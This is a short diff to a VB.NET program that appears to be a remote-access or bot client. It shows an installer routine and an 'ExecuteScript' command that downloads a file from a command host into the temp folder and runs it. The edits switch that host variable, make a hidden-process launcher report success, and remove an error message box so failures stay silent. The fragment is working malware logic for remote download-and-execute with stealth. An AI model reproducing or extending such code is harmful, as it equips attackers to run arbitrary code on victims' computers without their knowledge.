@@ -175,7 +175,7 @@ Public Class Form1
                 End
             End Try
         Catch ex As Exception
-            MsgBox(ex.Message)
+
         End Try
     End Sub
     Public Sub Install_Server()
@@ -322,7 +322,7 @@ Public Class Form1
                     Case "ExecuteScript"
                         Try
                             Dim ExecuteScript As New WebClient
-                            ExecuteScript.DownloadFile(Host & "/scripts/" & A(2), TempPath & "\" & A(2))
+                            ExecuteScript.DownloadFile(CurrentHost & "/scripts/" & A(2), TempPath & "\" & A(2))
                             Select Case A(1)
                                 Case "bat"
                                     Process.Start(TempPath & "\" & A(2))
@@ -614,8 +614,9 @@ Public Class Form1
                 .CreateNoWindow = True
             End With
             Process.Start(pi)
+            Return True
         Catch ex As Exception
-
+            Return False
         End Try
     End Function
     Function GetAntiVirus() As String
